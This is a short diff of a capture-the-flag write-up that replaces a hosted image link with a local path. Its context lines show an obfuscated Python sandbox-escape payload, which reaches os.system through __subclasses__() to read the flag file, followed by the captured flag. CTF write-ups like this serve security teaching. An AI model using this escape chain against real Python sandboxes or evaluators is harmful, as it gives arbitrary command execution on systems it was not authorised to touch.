@@ -78,6 +78,6 @@ __builtins__.__class__.__base__.__subclasses__()["______________________________
 __builtins__.__class__.__base__.__subclasses__()["____________________________________________________________________________________________________________________".__len__()].__init__.__builtins__['__import__']('______os_____'["______".__len__():"________".__len__()]).__getattribute__('______system_____'["______".__len__():"____________".__len__()])('______cat flag_RRkxxMoAAG3mQpoq.txt_____'["______".__len__():"___________________________________".__len__()])
 ```
 
-<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FHtqmROjoIkv8e2bggLL7%2Fimage.png?alt=media&amp;token=cea1b332-8d2f-458b-af9c-51caf26c9849" alt=""><figcaption></figcaption></figure>
+<figure><img src="images/f2f018b6e45c148b1c239353.png" alt=""><figcaption></figcaption></figure>
 
 Flag: INTIGRITI{y0ur\_w15h\_w45\_6r4n73d\_bu7\_47\_wh47\_c057}
